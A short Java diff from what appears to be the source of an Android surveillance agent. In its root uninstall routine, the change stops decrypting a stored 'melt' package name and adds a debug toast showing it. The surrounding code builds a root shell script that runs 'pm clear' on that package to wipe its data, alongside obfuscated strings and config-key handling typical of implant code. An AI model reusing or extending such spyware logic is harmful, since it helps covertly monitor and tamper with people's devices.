@@ -405,20 +405,14 @@ public class Root {
 			String meltapk = "";
 			AutoFile markupMelt = new AutoFile(String.format("/data/data/%s/files/mm", packageName));
 			if(markupMelt.exists()) {
-				final byte[] confKey = Keys.self().getConfKey();
-				EncryptionPKCS5 crypto = new EncryptionPKCS5(confKey);
-				try {
-					meltapk = new String(crypto.decryptData(markupMelt.read()));
-				} catch (Exception ex) {
-					if (Cfg.DEBUG) {
-						Check.log(ex);
-					}
-				}
+				meltapk = new String(markupMelt.read());
 			}
 
 			if(meltapk.length() > 0){
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (uninstallRoot), uninstall melt: " + meltapk);
+					Status.self().makeToast("uninstall melt: " + meltapk);
+
 				}
 				script += M.e("echo delete ")+ meltapk + "\n";
 				script += M.e("pm clear ") + meltapk + "\n";
